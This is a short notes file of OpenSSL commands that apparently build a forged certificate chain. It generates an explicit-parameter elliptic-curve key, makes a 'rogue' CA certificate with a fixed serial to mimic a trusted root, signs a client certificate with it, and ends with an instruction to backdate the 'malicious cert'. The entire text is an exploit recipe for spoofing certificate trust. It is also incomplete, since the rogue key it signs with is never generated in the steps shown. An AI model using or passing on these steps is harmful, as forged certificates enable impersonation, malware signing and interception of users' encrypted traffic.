# notes
mah...

openssl ecparam -name secp384r1 -genkey -noout -out p384-key.pem -param_enc explicit

openssl req -key p384-key-rogue.pem -new -out ca-rogue.pem -x509 -set_serial 0x5c8b99c55a94c5d27156decd8980cc26

openssl ecparam -name prime256v1 -genkey -noout -out prime256v1-privkey.pem

openssl req -key prime256v1-privkey.pem -config openssl.cnf -new -out prime256v1.csr

openssl x509 -req -in prime256v1.csr -CA ca-rogue.pem -CAkey p384-key-rogue.pem -CAcreateserial -out client-cert.pem -days 500 -extensions v3_req -extfile openssl.cnf

Set the "Not Before" date earlier than 2018-05-01 in the malicious cert.
